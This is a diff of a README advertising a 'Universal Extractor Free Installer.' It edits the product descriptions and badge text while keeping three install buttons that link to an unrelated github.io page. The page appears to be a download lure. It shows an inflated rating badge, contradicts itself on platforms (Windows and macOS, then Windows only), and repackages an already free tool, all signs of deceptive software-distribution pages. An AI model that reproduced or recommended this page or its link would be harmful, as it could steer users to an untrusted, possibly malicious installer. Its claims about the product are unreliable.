@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Archive+Tool-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Archive+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Universal Extractor Free Installer** — Universal Extractor is a free Windows tool that extracts files from virtually any type of archive or installer format including NSIS, InstallShield, AutoIt, Inno Setup, and many proprietary installer formats — going beyond standard archive managers.. Works without internet access, no account required. Full offline installation.
+**💻 Universal Extractor Free Installer** — Universal Extractor is a free Windows tool for extracting files from virtually any archive or installer format — ZIP, RAR, 7-Zip, MSI, EXE installers, ISO images, and hundreds of other formats. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Universal Extractor](https://img.shields.io/badge/⬇_Install_Universal%20Extractor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Universal Extractor](https://img.shields.io/badge/⬇_Install_Universal+Extractor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Universal Extractor
 
-Universal Extractor is a free Windows tool that extracts files from virtually any type of archive or installer format including NSIS, InstallShield, AutoIt, Inno Setup, and many proprietary installer formats — going beyond standard archive managers.
+Universal Extractor is a free Windows tool for extracting files from virtually any archive or installer format — ZIP, RAR, 7-Zip, MSI, EXE installers, ISO images, and hundreds of other formats. Using a collection of backend extraction utilities, Universal Extractor can handle formats that dedicated archive managers miss, making it indispensable for extracting files from unusual packages.
 
 ---
 
 ## ❌ Problem: Universal Extractor is hard to access
 
-- **Windows Only** — Not available on macOS or Linux
-- **Development Inactive** — Original project discontinued; community fork (UniExtract2) continues
-- **Technical Use Case** — Primarily useful for extracting from obscure or proprietary installer formats
-- **Limited Interface** — No graphical browse-and-preview; extraction only
+- **Windows Only** — No cross-platform support
+- **Backend Dependencies** — Relies on installed helper tools for various format support
+- **Development Status** — Original version unmaintained; Universal Extractor 2 is the active fork
+- **UI Design** — Simple but dated interface
 
 ---
 
@@ -81,7 +81,7 @@ Universal Extractor is a free Windows tool that extracts files from virtually an
 
 <div align="center">
 
-[![⬇ Install Universal Extractor](https://img.shields.io/badge/⬇_Install_Universal%20Extractor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Universal Extractor](https://img.shields.io/badge/⬇_Install_Universal+Extractor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Universal Extractor is a free Windows tool that extracts files from virtually an
 
 ---
 
-**Universal Extractor Free Installer** — Universal Extractor is a free Windows tool that extracts files from virtually any type of archive or installer format including NSIS, InstallShield, AutoIt, Inno Setup, and many proprietary installer formats — going beyond standard archive managers.. Install without internet connection today!
+**Universal Extractor Free Installer** — Universal Extractor is a free Windows tool for extracting files from virtually any archive or installer format — ZIP, RAR, 7-Zip, MSI, EXE installers, ISO images, and hundreds of other formats. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Universal Extractor](https://img.shields.io/badge/⬇_Install_Universal%20Extractor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Universal Extractor](https://img.shields.io/badge/⬇_Install_Universal+Extractor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
